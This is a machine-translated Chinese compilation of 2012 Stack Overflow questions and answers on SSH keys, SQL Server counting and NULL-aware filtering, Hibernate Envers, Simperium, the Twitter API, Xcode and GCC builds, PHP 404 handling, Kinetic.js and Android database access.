## 回答 #5

> 赞同：0
> 
> 时间：2012-08-14T15:27:19.840

您必须检查`*node`自己是否`NULL`在`dty_vertex`.

# ssh - 将 PuTTY Windows 格式的公钥转换为 Mac 格式

> ID：11955648
> 
> 赞同：0
> 
> 时间：2012-08-14T15:24:11.177
> 
> 标签：ssh, openssh

我需要将我的 PrivateKey 和 PublicKey 从我的 windows 机器转换为`.ssh`文件夹下的 Mac。

这是为 PrivateKey 完成的，我成功地转换了它，但不是为 PublicKey。

我尝试过多次使用不同的命令，但没有运气。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:37:55.307

如果您已经转移了私钥，则可以从中派生公钥。使用 ssh-keygen -y。

# sql-server - 选择脚本以包含另一个表的计数？

> ID：11955649
> 
> 赞同：-1
> 
> 时间：2012-08-14T15:24:12.783
> 
> 标签：sql-server, sql-server-2008-r2

我试图弄清楚如何编写脚本以从一个表中选择某些记录/字段，然后将其连接到另一个表并包含相应计数的列。例如，这就是我现在所拥有的：

```
select ID, Val from OriginalTable where Something = 1 
```

现在我有另一个表，其中包含链接到该原始表的记录，其中 a列`OriginalID`与`ID`. `OriginalTable`一个例子是：

```
select * from OtherTable where OriginalID = 3 
```

...其中 3 =`ID`的`OriginalTable`。

我想要做的是在第一个语句中添加一个列，该列显示另一个表的计数，如第二个查询中所示。例如，这可能是一个结果集：

```
ID    Val    Count
1     abc    15
2     def    23
3     ghi    42
4     jkl    19 
```

如何编写此查询以包含此计数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:28:00.667

有很多方法可以做到这一点，但您可以使用`Group By`

```
select ID, Val, [Count] = count(1)
from OriginalTable be
left join OtherTable ot on be.OriginalID = ot.OriginalID
where Something = 1
group by ID,Val 
```

或者你可以使用`OVER`and `Partition By`：

```
select ID, Val, [Count] = count(1) OVER(PARTITION BY ID,Val)
from OriginalTable be
left join OtherTable ot on be.OriginalID = ot.OriginalID
where Something = 1 
```

我个人喜欢这种`OVER`方法。[这里](http://msdn.microsoft.com/en-us/library/ms189461.aspx)有 MSDN 上的信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T15:29:39.010

子查询应该为您处理：

```
SELECT 
  ID, Val, Cnt
FROM OriginalTable
JOIN (
  SELECT 
    OriginalID, COUNT(*) AS Cnt
  FROM OtherTable
  GROUP BY OriginalID
  ) AS Sub ON ID=OriginalID 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:28:11.520

```
;WITH ot(ID, c) AS 
(
  SELECT OriginalID, COUNT(*)
   FROM dbo.OtherTable
   GROUP BY OriginalID
)
SELECT t.ID, t.Val, [Count] = COALESCE(ot.c, 0)
  FROM dbo.OriginalTable AS t
  LEFT OUTER JOIN ot
  ON t.ID = ot.ID
  WHERE t.Something = 1; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-14T15:29:12.860

```
SELECT be.ID, be.Val, Count(*) AS [Count]
FROM OriginalTable be
LEFT OUTER JOIN OtherTable ot ON be.ID = ot.OriginalID
WHERE be.Something = 1
GROUP BY be.ID, be.Val 
```

# java - envers：获取引用未审计实体的审计实体

> ID：11955654
> 
> 赞同：3
> 
> 时间：2012-08-14T15:24:39.633
> 
> 标签：java, hibernate, hibernate-envers

我在尝试让经审计的实体引用未经审计的实体时遇到问题。在我们的应用程序中，某些实体是在不使用休眠的情况下引导的，这些实体是我们的元模型，不需要审计。

### 工作示例：

```
public class A {
  private String id;
  private List<B> attributeReferences;
}

public class B {
  private String id;
  private A attributeReference;
} 
```

如果我执行代码：

```
A rev1 = getAuditReader().find(A.class, "foo", 1);
A rev2 = getAuditReader().find(A.class, "foo", 2);
A rev3 = getAuditReader().find(A.class, "foo", 3); 
```

一切顺利，但是如果我尝试获取 B 的版本，则会发生错误：

```
B rev2 = getAuditReader().find(B.class, "bar", 2); 
```

org.hibernate.ObjectNotFoundException：不存在具有给定标识符的行 [metafoo]

Envers 通过对我的 metafoo 实体的惰性引用成功地查找了 B 实体。但是，当尝试将其存储在其缓存中时，我的 B 实体的 hashcode 方法被调用，这反过来会查找审计表中不存在的 metafoo，从而引发异常。

有没有办法可以忽略那些不存在的引用而不是抛出这个错误？（也许通过在查询中排除此类引用）

如何完全处理不存在的数据（假设我们从审计表中删除了所有超过 1 个月的条目）我们如何仍然查询引用不存在的实体？

### PS：

如果可能，我不想修改哈希码函数
我不想审核我的元模型

### 表结构：

表一：

```
ID  
----------------------------------------
metaFooAttribute  
fooAttribute
foo 
```

表 A_AUD：

```
REV    REVTYPE    ID  
----------------------------------------
1      0          fooAttribute
1      0          foo  
2      1          foo  
3      1          foo 
```

表 B：

```
ID
----------------------------------------
bar 
```

表 B_AUD：

```
REV    REVTYPE    ID    ATTRIBUTE_ID  
----------------------------------------
1      0          bar   metaFooAttribute
1      0          bar   fooAttribute
2      1          bar   fooAttribute 
```

### 堆栈跟踪：

```
org.hibernate.ObjectNotFoundException: No row with the given identifier exists: [playground.test.A#metafoo]
at org.hibernate.impl.SessionFactoryImpl$2.handleEntityNotFound(SessionFactoryImpl.java:435)
at org.hibernate.proxy.AbstractLazyInitializer.checkTargetState(AbstractLazyInitializer.java:189)
at org.hibernate.proxy.AbstractLazyInitializer.initialize(AbstractLazyInitializer.java:178)
at org.hibernate.proxy.AbstractLazyInitializer.getImplementation(AbstractLazyInitializer.java:215)
at org.hibernate.proxy.pojo.cglib.CGLIBLazyInitializer.invoke(CGLIBLazyInitializer.java:189)
at playground.test.A$$EnhancerByCGLIB$$3cdb0441.hashCode(<generated>)
at playground.test.B.hashCode(B.java:120)
at org.hibernate.envers.tools.Triple.hashCode(Triple.java:73)
at java.util.HashMap.put(HashMap.java:372)
at org.hibernate.envers.reader.FirstLevelCache.putOnEntityNameCache(FirstLevelCache.java:94)
at org.hibernate.envers.entities.EntityInstantiator.createInstanceFromVersionsEntity(EntityInstantiator.java:105)
at org.hibernate.envers.entities.EntityInstantiator.addInstancesFromVersionsEntities(EntityInstantiator.java:113)
at org.hibernate.envers.query.impl.EntitiesAtRevisionQuery.list(EntitiesAtRevisionQuery.java:110)
at org.hibernate.envers.query.impl.AbstractAuditQuery.getSingleResult(AbstractAuditQuery.java:108)
at org.hibernate.envers.reader.AuditReaderImpl.find(AuditReaderImpl.java:119)
at org.hibernate.envers.reader.AuditReaderImpl.find(AuditReaderImpl.java:94)
at playground.test.TestEnvers.testGetAttribute(TestActivityStream.java:60)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:597)
at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:45)
at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:42)
at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
at org.springframework.test.context.junit4.statements.RunBeforeTestMethodCallbacks.evaluate(RunBeforeTestMethodCallbacks.java:74)
at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:82)
at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:72)
at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:240)
at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:47)
at org.junit.runners.ParentRunner$3.run(ParentRunner.java:231)
at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:60)
at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:229)
at org.junit.runners.ParentRunner.access$000(ParentRunner.java:50)
at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:222)
at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61)
at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70)
at org.junit.runners.ParentRunner.run(ParentRunner.java:300)
at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:180)
at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50)
at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197) 
```

### 编辑：

我发现这篇[文章](https://stackoverflow.com/questions/11449611/how-not-to-audit-a-join-table-and-related-entities-using-hibernate-envers)很有趣，但它并没有解决问题，因为我的参考是 A 类型，所以注释 @Audited(targetAuditMode = RelationTargetAuditMode.NOT_AUDITED) 不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T19:45:07.780

也许尝试将 @NotAudited 添加到元字段。然后该字段将不会被审计，但看起来好像您不想对其进行审计。否则 @Audited(targetAuditMode = RelationTargetAuditMode.NOT_AUDITED) 是要走的路。

# simperium - NSManagedObjectContextDidSaveNotification 和 Simperium

> ID：11955661
> 
> 赞同：0
> 
> 时间：2012-08-14T15:25:01.507
> 
> 标签：simperium

我没有从我提供给 Simperium 的 NSManagedObjectContext 收到 NSManagedObjectContextDidSaveNotification 通知。

基本上我喜欢做的是在由于 simperium 更新而发生数据库更新时通知我的应用程序。

因此，我使用 2 个 NSManagedObjectContexts，一个用于我的应用程序，另一个用于 Simperium。一旦我的应用程序保存了它的上下文，这些更改就会合并到 NSManagedObjectContextDidSaveNotification 通知中的 simperium 上下文中`mergeChangesFromContextDidSaveNotification:`。

然而问题是，每当对 Simperium NSManagedObjectContext 进行更新时，我都不会得到 NSManagedObjectContextDidSaveNotification，因此我无法将远程更改合并到我的应用程序上下文中。我检查了它是否确实将数据保存到持久存储中。

一些代码：

```
- (void) setSyncingEnabled:(BOOL)syncingEnabled
{
    if (syncingEnabled && !self.simperium)
    {
        [[NSNotificationCenter defaultCenter] addObserver:self
                                                 selector:@selector(syncingObjectContextDidSaveNotification:)
                                                     name:NSManagedObjectContextDidSaveNotification
                                                   object:self.syncingObjectContext];

        [[NSNotificationCenter defaultCenter] addObserver:self
                                                 selector:@selector(objectContextDidSaveNotification:)
                                                     name:NSManagedObjectContextDidSaveNotification
                                                   object:self.objectContext];

        self.simperium = [[Simperium alloc] initWithRootViewController:App.delegate.window.rootViewController];
        self.simperium.authenticationOptional = YES;
        [self.simperium addDelegate:self];

        [self.simperium startWithAppID:kSimperiumAppId
                                APIKey:kSimperiumAPIKey
                                 model:self.objectModel
                               context:self.syncingObjectContext
                           coordinator:self.storeCoordinator];
    }
    else if (self.simperium) {
        self.simperium = nil;

        [[NSNotificationCenter defaultCenter] removeObserver:self name:NSManagedObjectContextDidSaveNotification object:self.syncingObjectContext];
        [[NSNotificationCenter defaultCenter] removeObserver:self name:NSManagedObjectContextDidSaveNotification object:self.objectContext];
    }
}

- (void) objectContextDidSaveNotification:(NSNotification*)notification
{
    if (self.simperium) {
        [self.syncingObjectContext mergeChangesFromContextDidSaveNotification:notification];
    }
}

- (void) syncingObjectContextDidSaveNotification:(NSNotification*)notification
{
    [self.objectContext mergeChangesFromContextDidSaveNotification:notification];

    /* Inform Application */
    [[NSNotificationCenter defaultCenter] postNotificationName:DatabaseDidUpdateExternallyNotification object:self];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T19:18:29.130

我挖得更深一点，发现 Simperium SDK 没有使用你给它的对象上下文，而是另一个私有创建的对象上下文。这就是为什么你给它的上下文永远不会被保存。当前没有公共 API 可以访问私有并发上下文。

如果你不想使用 NSFetchedResultsController，因为你同步了很多对象并且性能不是很好，你也可以简单地在对象更新后发送一个通知来处理更新你的 UI。

以下代码似乎有效（主分支）：

```
-(void)objectKeysChanged:(NSSet *)keyArray entityName:(NSString *)entityName
{
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(informAppAboutExternalChange) object:nil];
    [self performSelector:@selector(informAppAboutExternalChange) withObject:nil afterDelay:0.5];
}

- (void) informAppAboutExternalChange
{
    [[NSNotificationCenter defaultCenter] postNotificationName:kObjectsDidChangeExternallyNotification object:nil];
} 
```

只需在需要更新 UI 的地方观察通知即可。延迟执行还应该防止过于频繁地触发通知，这也会降低性能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T19:43:24.507

由于您的目标是在通过 Simperium 发生更新时通知您的应用程序，因此有比使用单独的上下文更好的选择（无论如何 Simperium 在内部都会这样做）：

1）您可以使用`NSFetchedResultsController`在插入、更改和删除对象时调用的。

2) 你可以`SimperiumDelegate`用来对特定的变化做出反应。这在当前正在 GitHub 上的“iosupdate”分支中测试的版本中有点不同。该`SimperiumDelegate`协议将被替换`SPBucketDelegate`为让您更好地控制您关心的通知。

如果出于某种原因您确实需要使用第二个上下文，请[与我们联系](http://simperium.com/contact/)，以便我们进一步讨论您的用例。

# api - Twitter API 通过邮件 ID 搜索用户

> ID：11955662
> 
> 赞同：0
> 
> 时间：2012-08-14T15:25:03.300
> 
> 标签：api, search, twitter

我正在开发一个应用程序，我想知道是否有任何方法可以通过他/她的邮件 ID 搜索特定用户。我知道 twitter 曾经提供过这样的 API，但后来考虑到安全问题撤回了它们。那么有什么方法可以通过注册的电子邮件ID搜索用户吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:32:33.943

我无法使用[tmhOAuth](https://github.com/themattharris/tmhOAuth)
这是返回数组，没有看到任何有关电子邮件的信息

```
stdClass Object
(
        [geo] => 
        [favorited] => 
        [text] => Don't slip up http://t.co/cndsjkA
        [possibly_sensitive] => 
        [in_reply_to_status_id_str] => 
        [in_reply_to_status_id] => 
        [in_reply_to_user_id_str] => 
        [in_reply_to_user_id] => 
        [truncated] => 
        [entities] => stdClass Object
                (
                        [hashtags] => Array
                                (
                                )

                        [user_mentions] => Array
                                (
                                )

                        [media] => Array
                                (
                                        [0] => stdClass Object
                                                (
                                                        [type] => photo
                                                        [indices] => Array
                                                                (
                                                                        [0] => 14
                                                                        [1] => 34
                                                                )

                                                        [sizes] => stdClass Object
                                                                (
                                                                        [medium] => stdClass Object
                                                                                (
                                                                                        [resize] => fit
                                                                                        [w] => 360
                                                                                        [h] => 450
                                                                                )

                                                                        [thumb] => stdClass Object
                                                                                (
                                                                                        [resize] => crop
                                                                                        [w] => 150
                                                                                        [h] => 150
                                                                                )

                                                                        [small] => stdClass Object
                                                                                (
                                                                                        [resize] => fit
                                                                                        [w] => 340
                                                                                        [h] => 425
                                                                                )

                                                                        [large] => stdClass Object
                                                                                (
                                                                                        [resize] => fit
                                                                                        [w] => 360
                                                                                        [h] => 450
                                                                                )

                                                                )

                                                        [media_url_https] => https://p.twimg.com/****************.jpg
                                                        [url] => http://t.co/cndsjkA
                                                        [id_str] => ******************
                                                        [display_url] => pic.twitter.com/cndsjkA
                                                        [id] => ******************
                                                        [media_url] => http://p.twimg.com/****************.jpg
                                                        [expanded_url] => http://twitter.com/myapp/status/******************/photo/1
                                                )

                                )

                        [urls] => Array
                                (
                                )

                )

        [source] => myCompany demo
        [retweeted] => 
        [retweet_count] => 0
        [id_str] => ******************
        [coordinates] => 
        [user] => stdClass Object
                (
                        [default_profile_image] => 1
                        [follow_request_sent] => 
                        [following] => 
                        [profile_background_color] => C0DEED
                        [profile_image_url] => http://a0.twimg.com/sticky/default_profile_images/default_profile_3_normal.png
                        [description] => 
                        [profile_background_tile] => 
                        [favourites_count] => 0
                        [friends_count] => 11
                        [statuses_count] => 1
                        [verified] => 
                        [profile_sidebar_fill_color] => DDEEF6
                        [notifications] => 
                        [profile_background_image_url_https] => https://si0.twimg.com/images/themes/theme1/bg.png
                        [profile_sidebar_border_color] => C0DEED
                        [url] => 
                        [location] => 
                        [listed_count] => 0
                        [contributors_enabled] => 
                        [geo_enabled] => 
                        [profile_image_url_https] => https://si0.twimg.com/sticky/default_profile_images/default_profile_3_normal.png
                        [id_str] => 595959934
                        [lang] => en
                        [profile_use_background_image] => 1
                        [time_zone] => Atlantic Time (Canada)
                        [protected] => 
                        [default_profile] => 1
                        [profile_text_color] => 333333
                        [followers_count] => 2
                        [name] => myCompany
                        [is_translator] => 
                        [show_all_inline_media] => 
                        [profile_background_image_url] => http://a0.twimg.com/images/themes/theme1/bg.png
                        [screen_name] => myapp
                        [id] => 595959934
                        [utc_offset] => -14400
                        [created_at] => Fri Jun 01 00:21:13 +0000 2012
                        [profile_link_color] => 0084B4
                )

        [contributors] => 
        [in_reply_to_screen_name] => 
        [id] => ******************
        [place] => 
        [created_at] => Tue Aug 14 15:28:23 +0000 2012
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T02:47:36.650

根据[Twitter Developers](https://dev.twitter.com/)上的[讨论](https://dev.twitter.com/discussions/4019)，用户名和用户的电子邮件是两个完全不同的东西。以下引述由 Twitter 技术人员 ( [@episod](https://twitter.com/episod) ) 在讨论中撰写：

> Facebook 和 Google 都以实际身份为基础——电子邮件地址在那里很有意义。Twitter 与现实世界的身份没有那么紧密的联系——曾经可以说与帐户关联的电子邮件地址比其他任何东西都更像是一种形式，而不是必须附加到帐户或其所有者身份的信息。

因此，您似乎无法通过 Twitter API 使用用户的电子邮件检索用户名。唯一要做的就是向用户发送一封电子邮件，以询问他（或她）的 Twitter 用户名。

# emacs - 显示 Cedet 中的所有类方法

> ID：11955689
> 
> 赞同：0
> 
> 时间：2012-08-14T15:26:42.923
> 
> 标签：emacs, cedet

有没有办法在 cedet 中只显示 C++ 类声明（方法和属性）？一种速度条，但仅限于特定类别。

# xcode - 在 OS X 上从 XCode 迁移到 GCC

> ID：11955690
> 
> 赞同：0
> 
> 时间：2012-08-14T15:26:43.297
> 
> 标签：xcode, macos, gcc, compiler-construction

我有一个基于 Snow Leopard、XCode 3.2.6 并针对 10.5 SDK 32/64bit、INTEL 的代码库。工作正常。我在虚拟机中执行此操作。

现在我已经`GCC 4.7.1`编译并使用了 Mountain Lion，安装了 XCode 4.4 工具，这样我就可以拥有所有必要的库和依赖项。

我想从 XCode 转移到针对 10.5 SDK 的 GCC，甚至 10.6 SDK 都可以。

我必须创建一个 MakeFile 吗？有没有办法从 XCode 中导出一个？我不太了解从头开始创建 MakeFile。

我知道我可以附加`-mmacosx-version-min=10.5`到 gcc 命令并且我也必须告诉它 64 位。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T19:42:34.400

你混淆了多种不同的东西。

如果你想从 Xcode 切换到 vim，你可以……去做。如果您已经安装了 Xcode 命令行工具，那么您的路径上就有 gcc、make 等，它们会正常工作，而且您根本不必考虑 Xcode。事实上，您甚至可以安装命令行工具而不需要 Xcode 的其余部分。

如果你想从 Xcode 工具链切换到不同的工具链，或者使用混合工具链，你可以这样做。你已经安装了 gcc 4.7.1。好的，现在使用`gcc_select`, 或`export CC=/usr/local/bin/gcc-4.7.1`, 或硬编码你的 makefile 中的路径，或者任何你想要的。这与在任何其他 POSIX 平台上拥有多个工具链没有什么不同。

如果您想在不运行 Xcode 的情况下构建 Xcode 项目，可以`xcodebuild`从命令行使用。

如果您想将现有项目从 Xcode 转换为 Makefile（或 cmake 或其他），您必须手动执行此操作。通常这并不难，除非项目非常复杂或做了很多 Xcode 特定的事情。您可以从构建输出中看到 Xcode 正在运行的所有实际命令。

如果你想学习如何创建 Makefile，那里有很多很好的教程。但第一个问题是：为什么？学习一些更容易的东西，比如 cmake 是否可以接受，或者这里的全部目标是学习 make？

如果您想进行基于 SDK 的开发，请通过`-arch`gcc 4.7.1 传递并使用其他 Apple 特定的 gcc 扩展……好吧，您不能。这些对 gcc 的扩展尚未移植到任何较新的版本。如果您想自己完成移植它们的工作，我敢肯定有人会喜欢它，但工作量很大。

而且，如果您想使用 gcc 4.7.1 构建其他人的代码，那么很有可能也无法开箱即用。大多数特定于 Mac 的开源项目都依赖于 Apple gcc 扩展，并且大多数跨平台开源项目都有自动工具设置，可以检测到你在 Mac 上并拥有 Xcode 命令行工具并设置自己依赖于那些扩展名。

那么，您对其中哪些有问题？

* * *

还有一件事：

该`macosx-version-min`设置与 SDK 完全不同，而且是互补的。

例如，要将 SDK 设置为 10.5，您必须为其他目录（例如，对于 C++ stdlib）传递`-isystem $PATH_TO_10_5_SDK/usr/include`和可能的附加标志，有时将标志传递给链接器，有时将标志传递给编译器和/或链接器。`-isystem``/usr``-L``-F`

您还必须*拥有*SDK。获得 10.5 SDK 的唯一方法是使用 Xcode 3.2.6 或更早版本——我认为您甚至无法在 Mountain Lion 上安装它。此外，来自 Xcode 3.2.6 的 10.5 SDK 不知道如何在 10.6 之后的构建系统上工作，因此您必须手动破解它（主要是创建一堆符号链接，使其将 10.7 和 10.8 视为相同） 10.6)。而且，如果您使用的是非 Apple gcc，它也会在尝试查找各种​​内容时感到困惑，例如特定于编译器的标头（尤其是对于 C++），因此您需要对其进行更多修改。

为什么这么难？因为您几乎从不需要这样做，而 Apple 特别建议您不要这样做。它是他们过去建议在 10.4 天内做事的方式遗留下来的——但仅仅因为它存在并不意味着你应该使用它。

构建在 10.5 上运行的代码的正确方法是`-macosx-version-min=10.5`. 您可以而且实际上应该将它与与您的操作系统匹配的 SDK 一起使用（或者甚至可能是更新的 SDK，如果您希望能够使用下一个操作系统版本中的功能）。同样，这个标志可能只支持 clang 和 Apple 扩展的 gcc。但它使 SDK 中的所有内容都以向后兼容的模式神奇地工作。当然，除了在 10.6 或更高版本中添加的新功能 - 如果您尝试在 10.5 机器上进入全屏模式，您只会遇到异常或崩溃。Apple 有很好的文档说明哪些 API 添加到哪个版本，以及检查每种 API（Cocoa、CoreFoundation 和 POSIX）的正确方法。当然，您需要一台真正的 10.5 机器（或 VM）来进行测试。此外，C++ 标准库（仅限 10.5）存在一些错误，以及一些像 OpenSSL 这样的库，Apple 不再建议任何人针对系统副本构建以进行分发。但它仍然比尝试使用 10.5 SDK 构建要容易得多。这是苹果明确推荐的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T16:31:28.580

如果您想避免在 Xcode 中工作，但又想以相同的方式构建东西，您可以使用命令行工具`xcodebuild`，它将以与 Xcode 相同的方式构建 Xcode 项目。

# sql - 取 where 子句的逆来提取差异

> ID：11955691
> 
> 赞同：0
> 
> 时间：2012-08-14T15:26:44.267
> 
> 标签：sql, sql-server-2008

我的原始查询返回 7975 行。添加 where 子句，我收到 7917 行。我想要`SELECT`58 行的差异。为了做到这一点，我写了我认为是反向的 where 子句。不幸的是，我只看到 41 行，而不是预期的 58 行。

TableName.Column 和 TableName.Column2 都可以为空。

原来在哪里

```
where ((TableName.Column in ('1', '2', '3))
or (TableName.Column2 in ('1', '2', '3)) 
```

我的逆向尝试

```
where ((TableName.Column not in ('1', '2', '3))
and (TableName.Column2 not in ('1', '2', '3)) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:32:20.793

```
SELECT 
    * 
FROM 
    TableName 
EXCEPT 
SELECT 
    * 
FROM 
    TableName 
WHERE 
    ((TableName.Column IN ('1', '2', '3))
    OR (TableName.Column2 IN ('1', '2', '3)) 
```

顺便说一句，我怀疑 NULL 值会影响您的结果。空值不是`IN`，它们也不`NOT IN`是特定的集合。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:40:27.770

你的问题是NULL。真正的逆是：

```
where (coalesce(TableName.Column, '') not in ('1', '2', '3)) 
```

或者：

```
where tableName is NULL or (TableName.Column not in ('1', '2', '3)) 
```

对于这两列，这将是：

```
where (coalesce(TableName.Column, '') not in ('1', '2', '3)) and
      (coalesce(TableName.Column2, '') not in ('1', '2', '3) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T17:18:06.457

如前所述，SQL 的 3-way 逻辑要求`null`所有测试都失败，除非是明确的无效测试。

如果`x`为 null 则测试`x = 3`与 text 一样失败`x != 3`。此外，测试`x = null`失败（这不是对无效性的明确测试）。对于空值“正确”成功或失败的唯一测试是 test `x is [not] null`。

SQL Server 的问题在于它的默认行为 WRT`null`不能那样工作。

但是，如果您编写 SQL 查询以正确检查 null/non-null，则无论数据库行为如何，查询都将正常工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:44:03.923

你在哪里都有一个`'`和一个`)`缺失。我想这是一个错字。

所以你原来的查询是：

```
where ((X) or (Y)) 
```

你改成

```
where ((!X) and (!Y)) 
```

这不是一回事。在第一个示例中，只需要满足一个条件来评估查询，因此将返回 Column 上为 1 的行。第二，两者都需要为真，因此它只会返回在第 1 列和第 2 列上没有 1、2 或 3 的行

你究竟需要返回什么？

# php - 什么时候会通知爬虫一个页面是 404？

> ID：11955695
> 
> 赞同：0
> 
> 时间：2012-08-14T15:27:00.833
> 
> 标签：php, http-status-code-404, web-crawler

我一直在考虑使用 php 脚本作为 404 页面和数据库来匹配原始页面的 URI 到可能的重定向（如果存在）（否则显示 404 HTML）。

我正在做一些阅读和搜索，并在 404 上遇到了这个问题[301 redirect with PHP and MySQL](https://stackoverflow.com/questions/748135/301-redirect-with-php-and-mysql-on-404)。这几乎就是我想要做的。

我有一个问题由此引发，并阻止我尝试实施它。什么时候会通知爬虫一个页面是 404？

我想假设客户端（无论是用户还是机器人）将请求页面，服务器将获取 404 脚本+页面，解析 php，然后将 404 页面或匹配的重定向页面返回给客户端。这是正确的吗？客户端会在页面返回之前忽略 404 状态吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:28:49.087

> 客户端会在页面返回之前忽略 404 状态吗？

是的。在您收到对请求的响应之前，您无法知道会收到 404 错误。

# javascript - 我的 html5 画布和 Kinetic.js 代码不起作用

> ID：11955696
> 
> 赞同：2
> 
> 时间：2012-08-14T15:27:03.380
> 
> 标签：javascript, html, canvas, kineticjs

它的工作：http: [//jsfiddle.net/qYYm5/](http://jsfiddle.net/qYYm5/)

我最近从这里发现了 Kinetic.js：[http ://www.kineticjs.com/](http://www.kineticjs.com/)

我试图按照那个例子，但没有任何工作......

此代码应在图层“background_layer”上绘制图像“iPhoneBg.jpg”。不用说我的形象是存在的。

```
<!DOCTYPE HTML>
<html>
  <head>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.8.0.min.js"></script>
    <script src="Kinetic.min.js"></script>
    <style>
      body {
        margin: 0px;
        padding: 0px;
      }
    </style>
    <script>
        window.onload = function() {
            //INITIALISATION
            var stage = new Kinetic.Stage({
                container: "iPhone",
                width: 480,
                height: 720
            });
            //LAYERS
            var background_layer = new Kinetic.Layer();
            var sms_layer = new Kinetic.Layer();
            var text_layer = new Kinetic.Layer();
            //ELEMENTS
            var iPhoneBg_image = new Kinetic.Image({
                image: 'iPhoneBg.jpg'
            });
            //DRAWING
            background_layer.add(iPhoneBg_image);
            stage.add(background_layer);
        };

    </script>
  </head>
  <body>
    <canvas id="iPhone" width="480" height="720"></canvas>
  </body>
</html> 
```

这里有什么问题？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:53:05.403

```

 `window.onload = function() {
        //INITIALISATION
        var stage = new Kinetic.Stage({
            container: "iPhone",
            width: 480,
            height: 720
        });
        //LAYERS
        var background_layer = new Kinetic.Layer();
        var sms_layer = new Kinetic.Layer();
        var text_layer = new Kinetic.Layer();

        //ELEMENTS
        var imageObj = new Image();
        imageObj.onload = function() {
            var iPhoneBg_image = new Kinetic.Image({
            image: imageObj
            });
            //DRAWING
            background_layer.add(iPhoneBg_image);
            stage.add(background_layer);
        }
        imageObj.src = "iPhoneBg.jpg";
    };

<body><div id="iPhone"></div></body>` 

```

# android - （需要建议）从我的 Android 应用程序与 MySQL 服务器数据库交谈

> ID：11955699
> 
> 赞同：6
> 
> 时间：2012-08-14T15:27:10.130
> 
> 标签：android, mysql, database

我正在开始我的论文，这是一个适用于 android 的应用程序。这个应用程序基于我创建的网络平台。

我需要建议的部分是：*这是将数据从 MySQL 服务器拉入应用程序的最有效方式。请给我一些建议和你在这件事上的经验。*

（我已经阅读了关于在 json 中编码查询的内容，但这似乎是很多不必要的工作）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-14T23:33:30.347

我建议您[在 Java 中使用 RESTful Web 服务，使用 Jersey](http://www.vogella.com/articles/REST/article.html)作为 Android 应用程序和 MySQL 服务器之间的中间层。您可以将 JSON（我对移动应用程序的建议）、xml 或 palin 文本格式的数据传输到您的 Android 应用程序。

您可以在@Elad 回答中找到在您的系统中使用 Web 服务的好处：[访问远程数据库的最佳方式：通过 Web 服务还是直接 DB 访问？](https://stackoverflow.com/questions/5689539/best-way-to-access-a-remote-database-via-webservice-or-direct-db-access)

以后如果您决定为您的系统开发其他智能手机平台，您只需要重用相同的 Web Service。因此，可以将此 Web 服务视为系统移动用户的通用协议。

我使用 Hibernate 将数据映射到 MySQL 数据库。[使用带有 Hibernate Persistence 的 Jersey 的 RESTful 服务](http://sberka.blogspot.se/2010/02/json-restfull-service-using-jersey-with.html)

